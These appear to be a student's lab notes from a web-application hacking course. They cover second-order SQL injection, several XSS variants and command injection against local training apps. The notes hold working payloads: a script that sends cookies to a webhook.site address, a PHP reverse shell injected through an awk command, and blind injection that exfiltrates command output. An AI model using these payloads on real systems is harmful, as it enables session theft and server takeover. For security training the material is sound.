┌──(cyber㉿kali)-[~/Desktop/bugbounty]
└─$ 

```
==================================================================

# ==Second Order SQL Injection==

Theory behind second order attacks is that you carry out your attack and you deliver your payload but its not executing until later on

For Lab
Create a user call testing & testing
Login to the user testing  & testing
At dashboard they have some bio info
Obviously some SQL happening in the background but currently we don't have any control over what's happening 
But we may have control over how these statements are formed 
So when we sign up our accounts we maybe able to inject a payload have that stored in the database and then later on that payload will be processed and we will achieve SQL injection 

Signup 
' or 1=1-- - & test
and then login using ' or 1=1-- - & test
and this highlights that even if a development team are not grabbing variables directly the user and passing them into dynamic SQL queries they might be a little bit lazy later on and write a dynamic SQL query with some data that they retrieve from the database but we have control over that data even if its not happening in the same request or the same session and as we can see bio jeremy like tiramsiu cuz our one or one equals is manipulating the SQL statement thats happening on this page 

Little bit deeper look at it SQL map it does have a second order function flag
Try Union attack or other attack to enumerate more info out of the database 

#   ==CROSS SITE SCRIPTING==

Assume We execute JavaScript in a victim's browser and often gives us control over the application for that user 

- Reflected -> script you are trying to inject comes from the current HTTP request You send a request and you get a response and that script is included in the response
- Stored -> Payload is stored in something like a database and than retrieved later this allows you to attack other users and therefore the impact of the vulnerability is much higher
- DOM-Based -> client side has some vulnerable JavaScript that uses untrusted input instead of having a vulnerability server side 

Avoid using alert(1) use print() to load the print  pop up or u can just prompt("hello") and get  a prompt box like this 
W3SCHOOL JavaScript tutorial

#   ==Basic Cross-Site Scripting (XSS) Attacks==

![[../Screenshot from 2024-06-21 02-52-34.png]]


We can add items and that gets render to the page Seems like Reflected XSS we give input and then it gets sent to the server and then its comeback 
Its DOM based Cross Site Scripting 
Open Network Tab reload the page and send the info and see that no request going and coming back to the server

Its happening entirely locally and it is a vulnerability with in the client this is DOM based cross site scripting 
Basic Payload ->  <script>prompt(1)</script>

this did not work cuz even though the code is being added to the page its not actually being called we need trigger 
Now if this was part of the page as we loaded the page then it would be triggered but in this case we have to think another way to trigger this

Another payload -> <img src=x onerror="prompt(1)">

Common payload document tries to load X it will throw an error and on the error we can execute some javascript 

Image failed to load we have got broken link icon browser at list side and then we get our JavaScript 
Challenge try the same payload and see if you can forward the user to different location 
<img src=x onerror="window.location.href='https://tcm-sec.com'">


# ==Stored Cross-Site Scripting (XSS) Attacks==


Setup Containers for testing this allow us to have multiple accounts and multiple sessions open and test across different user accounts

e.g Update Bobs account using Alice's session token

Extension Firefox -> Firefox Multi account containers 

We need to make sure cross site scripting is stored and not just for the same user that posts the payload
Make to containers and get on the lab

## [Labs](http://localhost/index.php) / XSS 0x02

## /r/mightJustWork



Lets assume two container means two account 
Container `1` = account `1`
Container `2` = account `2`

add a cookie on account no 1 using cookie editor cookie value = `hellothere` and verify this using inspect dev tools on storage
or at console type `document.cookie`
when test for XSS test for HTML injection first 
<h1>test</h1> use it in container 1 account post a comment

here we have a stored cross site scripting because we see our payload using container 2 which heading tag 

Verify the vulnerability 
Container 2 -> <script>prompt(1)</script>
Because the page reloaded when we submitted our input its then rendered to the page and then as the page loads its executed Where as Before The Page Wasn't Reloading 

SO our prompt was not executing So to prove that it is stored we can come over to second container click refresh and we can see the prompt 
So every user that comes to this page is going to impacted by our payload 

Since our first payload already has a set cookie which we set manually earlier lets come from container two and try something like <script>alert(document.cookie)</script>

Go back to container 1 and refresh and u see that we get the cookie
Best Practice set the cookie to HTTP only which is a flag that prevents JavaScript from accessing your cookie 
Play around and test some other payloads as well


#  ==CHALLENGE==

## [Labs](http://localhost/index.php) / XSS 0x03

## Support portal

### Fill in the form below to submit a support ticket.

Our team will check it ASAP!

### Support ticket


Coming to the challenge we get a form to submit a support ticket 

from container 1 submit a ticket 
from container 2 add endpoint to the url `_admin.php`
And the goal of this is to steal the admin cookie but not just pop it in alert box exfiltrate it 

Hint use netcat to listen locally or webhook.site which will give you unique address that you can make calls to 

Container 1 create a payload 
Container 2 trigger that payload 
Receive a request with contents of the administrator cookie

We control the admin and the normal user we could do some we can do some testing we can inject some HTML or we can inject some JavaScript 

Send a ticket from Jeremy
Create a new image on the screen and then set the source of that image to HTTPS webhook.site  a unique URI and then append to the document.cookie 
payload = <script> var i = new Image; i.src=""+document.cookie</script>
copy the address from webhook and paste in between the quotation and then we obviously want our cookie to be a parameter on the end so add `/?` at the end so what will happen when admin loads the page `var i`  will create a new image and a source of that image will be HTTP webhook site our unique URL and then `/?` at the end and the parameter would be `document.cookie`

When this processed browser would say we need the image from webhook.site and it will send the address to us and obviously instead of `+document.cookie` we will get the contents 

`https://webhook.site/bf49b1ad-4b3e-4048-a275-27f8c6045207/?admin_cookie=5ac5355b84894ede056ab81b324c4675`

verify this using console `document.cookie` in container 2

==================================================================

#   ==Introduction to Command Injection==

This Vuln can compromise the entire application and the host 
How it arrives? -> The application takes input from the user and then passing that into a function that executes it as code going against secure development principle of not mixing data and code 

**EVAL IS EVIL**
EVAL -> one of those function that executes the data that's passed to it 
Demonstrate browser using DevTools using console 
eval(1+1) -> 2
`let userInput = '7*7'` 
`eval(userInput)`
output -> 49

```php

┌──(cyber㉿kali)-[~]
└─$ php -a         
Interactive shell

php > $userInput = 'whoami';
php > system($userInput);
cyber
php > 

```


# ==Command Injection Attacks==

Command Injection Lab 1

## [Labs](http://localhost/index.php) / Command Injection 0x01

## Network check

What the form or checking sys u seeing likely to be found internally or externally exposed in a system or in admin functionality may allow command injection
To test it 
`http://localhost`
## Network check

Check target

Command: curl -I -s -L http://localhost | grep "HTTP/"

---

## Result: HTTP/1.1 200 OK

So it is returning first row of curl request

Chaining the command
`http://localhost;whoami`

## Network check

Check target

Command: curl -I -s -L http://localhost;whoami | grep "HTTP/"

---

## Result: HTTP/1.1 200 OK Date: Mon, 19 Aug 2024 19:13:53 GMT Server: Apache/2.4.54 (Debian) X-Powered-By: PHP/7.4.33 Access-Control-Allow-Origin: * Access-Control-Allow-Methods: * Content-Type: text/html; charset=UTF-8

Here we cant see www.data obvious that it is changed the output of the command server and that's changing whats including in grep lets try another command

`http://localhost;whoami;#`

## Network check

Check target

Command: curl -I -s -L http://localhost;whoami;# | grep "HTTP/"

---

## Result: HTTP/1.1 200 OK Date: Mon, 19 Aug 2024 19:16:55 GMT Server: Apache/2.4.54 (Debian) X-Powered-By: PHP/7.4.33 Access-Control-Allow-Origin: * Access-Control-Allow-Methods: * Content-Type: text/html; charset=UTF-8 www-data


Now it is returning www-data but we have to understand whats happening on the backend  to execute command what filtering taking place like limitation of character we can pass and hopefully we can achieve code execution
` ;whoami;#`

Next STEP is try to get a shell
payloads all the things on github
Methodology and Resources/Reverse Shell Cheatsheet.md

So to check which technology on backend is `;which php;#`
Command: curl -I -s -L ;which php;# | grep "HTTP/"

---

## Result: /usr/local/bin/php

Lets just try a PHP payload
`https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php`

try this one `php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'[](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#__codelineno-23-2)`

and paste in between 
`;paste;#`
Set the ip address and start the listener 

```sh
┌──(cyber㉿kali)-[~/Desktop/bugbounty]
└─$ nc -lvnp 4242
listening on [any] 4242 ...
connect to [192.168.100.42] from (UNKNOWN) [172.18.0.4] 59054
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname
c418d623de39
$ 
```

==================================================================



# ==Blind Command Injection==

https://book.hacktricks.xyz/pentesting-web/command-injection

## [Labs](http://localhost/index.php) / Command Injection 0x02

## Network check


Same situation in here 
## Network check

Check target

Target: http://localhost

---

## Website OK

This returns Website OK means we probably have blind command injections
now we will try this query
## [Labs](http://localhost/index.php) / Command Injection 0x02

## Network check

Check target

Target: http://localhost?q=`sleep10`

---

## Website OK
Our command is executed and and we could try blind command injection```

```
we could try different thing here instead of doing http://localhost we could add a listener we can do locally or we can use webhook.site

```

Go to the site and copy the unique url
and add a query at last by adding `?q=``whoami``
 https://webhook.site/1126163a-5d02-4709-af77-96f58f80f0d0?q=`whoami`
and we could check here www-data 
https://webhook.site/1126163a-5d02-4709-af77-96f58f80f0d0?q=www-data
```
This is in third party web app
```

=================================================================


# [Labs](http://localhost/index.php) / ==Command injection 0x03== [Challenge]

![](http://localhost/assets/fleettracker.png)

## Redirect vehicle

To redirect a vehicle, enter it's registration plate and new coordinates (0 to 10000).

Submit

## Current fleet

|Registration|Position|Destination|Status|
|---|---|---|---|
|ASH|100, 200|100, 200|parked|
|LJG|105, 55|200, 200|moving|
|UYG|145, 230|200, 200|moving|
|ALG|400, 105|400, 105|parked|

THIS Is a webpage 
and having an input field if i enter ASH and 50 , 50 and submit it would return something this 
```
Executed: awk 'BEGIN {print sqrt(((100-50)^2) + ((200-50)^2))}'  
Result: 158.114
```
Its look like its calc the distance between two points

our input is added in the return but what we need to find out is which one of these is which input box so Position Y box is easier to try our injection attack
By submitting TEST 123 789
```
Executed: awk 'BEGIN {print sqrt(((-123)^2) + ((-789)^2))}'  
Result: 798.53
```



WE can try to put on Position Y is **789)^2))}';whoami;#**

we could this in return as www-data

```
Executed: awk 'BEGIN {print sqrt(((-123)^2) + ((-789)^2))}';whoami;#)^2))}'  
Result: 798.53 www-data
```

Now lets execute a shell 
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php

grab the top one shell and copy it 
```
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'[](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#__codelineno-23-2)
```
MODIFY IT FOR THE SHELL
```

789)^2))}';php -r '$sock=fsockopen("192.168.100.42",4242);exec("/bin/sh -i <&3 >&3 2>&3");';#
```
 
 Modify IP AND SETUP A LISTENER
```sh
┌──(cyber㉿kali)-[~/Desktop/bugbounty]
└─$ nc -lvnp 4242
listening on [any] 4242 ...
connect to [192.168.100.42] from (UNKNOWN) [172.18.0.4] 46846
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

==================================================================

